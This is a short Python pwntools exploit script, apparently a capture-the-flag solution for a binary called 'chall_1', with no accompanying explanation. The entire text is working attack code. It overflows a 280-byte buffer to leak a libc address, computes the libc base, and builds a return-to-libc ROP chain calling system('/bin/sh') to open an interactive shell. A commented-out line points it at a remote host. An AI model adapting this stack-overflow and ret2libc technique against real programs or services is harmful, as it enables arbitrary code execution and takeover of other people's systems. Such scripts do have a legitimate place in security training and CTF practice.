from pwn import *

context.arch = 'amd64'

io = process("./chall_1")
#io = remote("192.168.159.132", 5000)

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

io.sendlineafter(b"Choose an option: ", b"1")

input("PAUSE")
io.send(b"A"*280)

io.recvuntil(b"A"*280)

leak_libc = u64(io.recv(6).ljust(8, b"\x00"))

print(f"Leaked libc address: {hex(leak_libc)}")

libc.address = leak_libc - 0x2724a

print(f"System: {hex(libc.sym.system)}")

pop_rdi = libc.address + 0x00000000000277e5
ret = libc.address + 0x0000000000026e99

payload = b"".join([
    b"A"*280,
    p64(pop_rdi),
    p64(next(libc.search(b"/bin/sh\x00"))),
    p64(ret),
    p64(libc.sym.system)
])

io.sendlineafter(b"Choose an option: ", b"1")
io.send(payload)

io.interactive()